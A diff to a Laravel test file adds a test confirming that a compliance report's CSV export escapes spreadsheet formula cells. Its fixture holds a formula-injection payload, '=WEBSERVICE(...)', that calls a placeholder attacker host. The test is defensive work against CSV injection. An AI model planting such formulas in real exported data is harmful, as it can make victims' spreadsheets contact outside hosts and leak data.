@@ -10,6 +10,7 @@ use App\Models\Framework;
 use App\Models\Risk;
 use App\Models\User;
 use App\Models\WorkUnit;
+use App\Services\ReportGeneratorService;
 use Database\Seeders\RolesAndPermissionsSeeder;
 use Illuminate\Foundation\Testing\RefreshDatabase;
 use Spatie\LaravelPdf\Facades\Pdf;
@@ -369,5 +370,25 @@ class ReportExportTest extends TestCase
             'aksi' => 'export',
             'actor_id' => $this->admin->id,
         ]);
+    }
+
+    public function test_csv_export_neutralizes_formula_cells(): void
+    {
+        ChecklistEntry::create([
+            'control_id' => $this->control->id,
+            'unit_id' => $this->unit->id,
+            'pic_id' => $this->pic->id,
+            'status' => ChecklistEntry::WORKFLOW_BELUM_DIMULAI,
+            'catatan_admin' => '=WEBSERVICE("http://evil.example/x")',
+        ]);
+
+        $response = app(ReportGeneratorService::class)->exportComplianceSummaryCsv($this->admin, null);
+
+        ob_start();
+        $response->sendContent();
+        $out = (string) ob_get_clean();
+
+        $this->assertStringNotContainsString(',"=WEBSERVICE', $out);
+        $this->assertStringContainsString("'=WEBSERVICE", $out);
     }
 }
